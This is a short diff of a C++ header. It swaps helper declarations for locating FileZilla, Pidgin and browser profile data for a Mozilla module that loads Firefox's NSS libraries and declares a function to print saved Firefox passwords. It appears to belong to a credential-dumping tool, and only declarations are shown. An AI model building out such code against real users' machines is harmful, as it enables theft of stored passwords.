@@ -27,15 +27,11 @@
 #include <Windows.h>
 #include <string>
 
-namespace libsystem {
-	HRESULT get_appdata_path(PWSTR* path);
-	HRESULT get_localappdata_path(PWSTR* path);
-	std::wstring get_filezilla_path(void);
-	std::wstring get_pidgin_path(void);
-	BOOL generate_temp_filename(LPCWSTR prefix, LPWSTR filename);
-	BOOL dump_to_file(LPCWSTR filename, LPWSTR data);
-	DWORD GetProcessIdByProcessName(LPCWSTR pszProcessName);
-	std::wstring get_chrome_path(std::wstring folder);
-	std::wstring get_opera_path(std::wstring folder);
-	std::wstring get_firefox_path(std::wstring folder);
+namespace libmozilla {
+	extern bool initialized;
+	extern HMODULE hnss3Lib;
+	extern HMODULE hmozglueLib;
+	void init(std::wstring nss3Dll, std::wstring mozglueDll);
+	void finalize(void);
+	void print_firefox_passwords(std::wstring path, std::wstring signons);
 }
